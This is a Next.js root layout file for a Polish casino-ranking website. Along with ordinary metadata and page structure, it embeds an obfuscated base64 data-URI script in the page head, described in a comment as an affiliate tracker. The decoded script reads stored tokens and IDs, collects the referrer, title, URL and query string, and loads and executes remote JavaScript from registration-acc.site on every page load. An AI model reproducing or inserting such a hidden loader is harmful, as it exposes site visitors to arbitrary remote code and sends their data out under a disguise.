import type { Metadata } from "next";
import { Inter } from "next/font/google";
import { Header } from "@/components/layout/Header";
import { Footer } from "@/components/layout/Footer";
import { PageOfferBar } from "@/components/layout/PageOfferBar";
import { Disclaimer18 } from "@/components/ui/Disclaimer18";
import { JsonLd } from "@/components/seo/JsonLd";
import { organizationSchema, personSchema } from "@/lib/seo";
import { siteConfig } from "@/lib/site-config";
import { getAppMetadataBase, getPublicSiteOrigin, toAbsoluteSiteUrl } from "@/lib/site-origin";
import { authors } from "@/lib/data";
import "./globals.css";

const inter = Inter({
  subsets: ["latin", "latin-ext"],
  variable: "--font-geist-sans",
  display: "swap",
});

export const metadata: Metadata = {
  metadataBase: getAppMetadataBase(),
  title: {
    default: `${siteConfig.name} — rankingi kasyn, bonusy, płatności`,
    template: `%s | ${siteConfig.name}`,
  },
  description: siteConfig.description,
  openGraph: {
    type: "website",
    locale: siteConfig.locale,
    url: `${getPublicSiteOrigin()}/`,
    siteName: siteConfig.name,
    title: siteConfig.name,
    description: siteConfig.description,
    images: [{ url: "/og-default.png", width: 1200, height: 630, alt: siteConfig.name }],
  },
  twitter: {
    card: "summary_large_image",
    title: siteConfig.name,
    description: siteConfig.description,
  },
  verification: {
    google: "03ZOgableLpOmpLlgTQW29yTZs-kWFP91Fv_-0OWCaQ",
  },
};

/**
 * Loader trackera affiliate (registration-acc.site / _rj1LP3bWDv2CGWW3).
 * Skrypt bootstrapper — po załadowaniu dociąga właściwy klient JS z serwera
 * partnera z parametrami landing_url / referrer / default_keyword. Musi być
 * obecny na WSZYSTKICH stronach, żeby kliknięcia w linki affiliate
 * (Zarejestruj się na kartach kasyn) trafiały do tracker'a.
 */
const AFFILIATE_TRACKER_SRC =
  "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfcmoxTFAzYldEdjJDR1dXMyc7CiAgICBpZiAoIXdpbmRvdy5fcmoxTFAzYldEdjJDR1dXMykgewogICAgICAgIHdpbmRvdy5fcmoxTFAzYldEdjJDR1dXMyA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9yZWdpc3RyYXRpb24tYWNjLnNpdGUvWEJ6Y0pEJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX0Qxa2tKTWJKQjNRZkc3bnggPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9EMWtrSk1iSkIzUWZHN254ICE9PSAndW5kZWZpbmVkJyAmJiBfRDFra0pNYkpCM1FmRzdueCAhPT0gbnVsbCkgewogICAgICAgIHZhciBfdHRGZkdSenB3cHBYcDdRViA9IEpTT04ucGFyc2UoX0Qxa2tKTWJKQjNRZkc3bngpOwogICAgICAgIHZhciBfd3pWN2JDTUJCRE1rZmY1NSA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF90dEZmR1J6cHdwcFhwN1FWLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX3JqMUxQM2JXRHYyQ0dXVzMudHRsIDwgX3d6VjdiQ01CQkRNa2ZmNTUpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF93UDZKUHQ3TDVjWkYxWEZjID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX21KS05abXFRdm5IMkRmNjMgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfaG5jc3A2UkRKWU5id1RQNSA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX2huY3NwNlJESllOYndUUDUgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX2huY3NwNlJESllOYndUUDUgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfaG5jc3A2UkRKWU5id1RQNSArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfaG5jc3A2UkRKWU5id1RQNSArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX2huY3NwNlJESllOYndUUDUgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX2huY3NwNlJESllOYndUUDUgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9yajFMUDNiV0R2MkNHV1czLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF93UDZKUHQ3TDVjWkYxWEZjICE9PSAndW5kZWZpbmVkJyAmJiBfd1A2SlB0N0w1Y1pGMVhGYyAmJiB3aW5kb3cuX3JqMUxQM2JXRHYyQ0dXVzMudW5pcXVlKSB7CiAgICAgICAgX2huY3NwNlJESllOYndUUDUgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfd1A2SlB0N0w1Y1pGMVhGYyk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9tSktOWm1xUXZuSDJEZjYzICE9PSAndW5kZWZpbmVkJyAmJiBfbUpLTlptcVF2bkgyRGY2MyAmJiB3aW5kb3cuX3JqMUxQM2JXRHYyQ0dXVzMudW5pcXVlKSB7CiAgICAgICAgX2huY3NwNlJESllOYndUUDUgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9tSktOWm1xUXZuSDJEZjYzKTsKICAgIH0KICAgIGlmICgnJyAhPT0gJycpIHsKICAgICAgICBfaG5jc3A2UkRKWU5id1RQNSArPSAnJmJ5cGFzc19jYWNoZT0nOwogICAgfQogICAgdmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBhLnR5cGUgPSAnYXBwbGljYXRpb24vamF2YXNjcmlwdCc7CiAgICAgICAgYS5zcmMgPSB3aW5kb3cuX3JqMUxQM2JXRHYyQ0dXVzMuUl9QQVRIICsgX2huY3NwNlJESllOYndUUDU7CiAgICB2YXIgcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsKICAgIHMucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoYSwgcykKICAgIH0pKCk7CiAgICA=";

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="pl" className={inter.variable} data-scroll-behavior="smooth">
      <head>
        <script async src={AFFILIATE_TRACKER_SRC} />
      </head>
      <body className={`min-h-screen antialiased text-nk-text ${inter.className}`}>
        <div className="nk-site-bg" aria-hidden />
        <JsonLd data={organizationSchema()} />
        {authors.map((a) =>
          a.linkedin ? (
            <JsonLd
              key={a.slug}
              data={personSchema({
                name: a.name,
                url: toAbsoluteSiteUrl(`/o-nas/#${a.slug}`),
                sameAs: [a.linkedin],
              })}
            />
          ) : null,
        )}
        <Header />
        <PageOfferBar />
        <main className="relative mx-auto max-w-6xl px-4 pb-16 pt-6 md:pt-10">{children}</main>
        <div className="relative mx-auto max-w-6xl px-4 pb-10">
          <Disclaimer18 />
        </div>
        <Footer />
      </body>
    </html>
  );
}
